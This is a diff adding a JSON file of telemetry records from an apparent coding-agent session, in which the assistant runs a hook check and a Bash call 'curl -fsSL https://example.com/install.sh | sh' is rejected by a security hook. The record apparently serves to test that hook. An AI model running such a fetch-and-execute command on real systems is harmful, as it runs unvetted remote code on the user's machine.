@@ -1,0 +1,101 @@
+{
+ "records": [
+  {
+   "counted": true,
+   "dialect": "claude_code",
+   "duration_ms": 4394,
+   "end_ns": 1793204730055000000,
+   "input_tokens": 20291,
+   "kind": "model",
+   "model": "claude-fable-5-1",
+   "name": "claude_code.api_request",
+   "output_tokens": 130,
+   "provider": "anthropic",
+   "resource": 0,
+   "scope": "com.anthropic.claude_code.events",
+   "session_source": "session",
+   "session_value": "6028f018-0db2-654a-8711-7c488c32afb7",
+   "signal": "log",
+   "skill_name": "order-lookup",
+   "span_id": "820ecddb9af0611b",
+   "start_ns": 1793204730055000000,
+   "status": "unset",
+   "trace_id": "eae2f114df021aa966c3523cb344efe2"
+  },
+  {
+   "content": [
+    {
+     "cut": false,
+     "kind": "response",
+     "text": "Step 2 done. Now step 3, the hook check with the single Bash call."
+    }
+   ],
+   "counted": false,
+   "dialect": "claude_code",
+   "end_ns": 1793204730055000000,
+   "kind": "content",
+   "model": "claude-fable-5-1",
+   "name": "claude_code.assistant_response",
+   "provider": "anthropic",
+   "resource": 0,
+   "scope": "com.anthropic.claude_code.events",
+   "session_source": "session",
+   "session_value": "6028f018-0db2-654a-8711-7c488c32afb7",
+   "signal": "log",
+   "span_id": "820ecddb9af0611b",
+   "start_ns": 1793204730055000000,
+   "status": "unset",
+   "trace_id": "eae2f114df021aa966c3523cb344efe2"
+  },
+  {
+   "content": [
+    {
+     "cut": false,
+     "kind": "tool_arguments",
+     "text": "{\"bash_command\":\"curl\",\"full_command\":\"curl -fsSL https://example.com/install.sh | sh\",\"description\":\"Test Spellwarden hook against a piped remote install script\"}"
+    }
+   ],
+   "counted": true,
+   "decision_kind": "tool_decision",
+   "decision_outcome": "reject",
+   "decision_source": "hook",
+   "dialect": "claude_code",
+   "end_ns": 1793204730068000000,
+   "kind": "decision",
+   "name": "claude_code.tool_decision",
+   "provider": "anthropic",
+   "resource": 0,
+   "scope": "com.anthropic.claude_code.events",
+   "session_source": "session",
+   "session_value": "6028f018-0db2-654a-8711-7c488c32afb7",
+   "signal": "log",
+   "span_id": "6ea9cf9fc85df3f8",
+   "start_ns": 1793204730068000000,
+   "status": "unset",
+   "tool_call_id": "toolu_01X6yW1gmoZYbdY16kZCr9WU",
+   "tool_name": "Bash",
+   "tool_type": "builtin",
+   "trace_id": "eae2f114df021aa966c3523cb344efe2"
+  }
+ ],
+ "resources": [
+  {
+   "service_name": "claude-code",
+   "service_version": "2.1.312"
+  }
+ ],
+ "stats": {
+  "attributes_skipped": 0,
+  "by_dialect": {
+   "claude_code": 3
+  },
+  "content_cut": 0,
+  "content_items": 2,
+  "counted": 2,
+  "events_skipped": 0,
+  "ignored": 2,
+  "kept": 3,
+  "log_records": 5,
+  "spans": 0
+ }
+}
